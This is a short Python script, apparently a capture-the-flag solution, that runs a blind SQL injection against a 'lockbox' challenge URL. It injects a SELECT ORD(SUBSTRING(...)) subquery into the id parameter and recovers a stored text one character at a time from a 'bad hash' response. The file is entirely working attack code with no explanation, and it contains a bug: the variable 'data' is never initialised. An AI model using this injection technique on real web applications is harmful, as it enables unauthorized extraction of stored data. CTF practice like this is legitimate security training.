import requests
import string
import sys

BASE64STR = string.ascii_letters + string.digits + "_-"

URL = "https://lockbox-6ebc413cec10999c.squarectf.com/?id=(SELECT ORD(SUBSTRING(data,{},1)) FROM texts WHERE id=3)='{}'&hash=XXXXXXX"
# URL = "http://localhost:8888/?id=(SELECT ORD(SUBSTRING(data,{},1)) FROM texts WHERE id=1)={}&hash=XXXXXXX"
for i in range(1, 1000):
    sys.stdout.write("[{}]".format(i))
    sys.stdout.flush()
    for c in BASE64STR:
        sys.stdout.write(c)
        sys.stdout.flush()
        r = requests.get(URL.format(i, ord(c)))
        if "bad hash" in r.text:
            data += c
            break
    print("\n" + data)
